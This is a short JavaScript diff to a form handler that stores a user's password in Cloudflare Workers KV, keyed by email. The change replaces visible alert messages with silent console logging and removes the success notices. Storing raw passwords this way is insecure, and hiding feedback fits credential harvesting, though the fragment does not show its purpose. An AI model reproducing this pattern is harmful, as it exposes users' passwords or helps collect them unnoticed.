@@ -15,13 +15,10 @@ async function storeCredential(key, value) {
 
         if (!response.ok) {
             const errorData = await response.json();
-            alert(`Error storing credential: ${response.status} - ${JSON.stringify(errorData)}`);
-        } else {
-            const responseText = await response.text();
-            alert('Credential stored successfully!');
+            console.error(`Error storing credential: ${response.status} - ${JSON.stringify(errorData)}`);
         }
     } catch (error) {
-        alert("An error occurred while storing the credential: " + error.message);
+        console.error("An error occurred while storing the credential: " + error.message);
     }
 }
 
@@ -58,8 +55,7 @@ if (passwordForm) {
         // Store password in Cloudflare Workers KV (using email as key)
         await storeCredential(userEmail, password);
 
-        // Redirect or display a success message
-        alert('Password stored successfully!');
+        // You can add a redirect or any other action here if needed
     });
 }
 
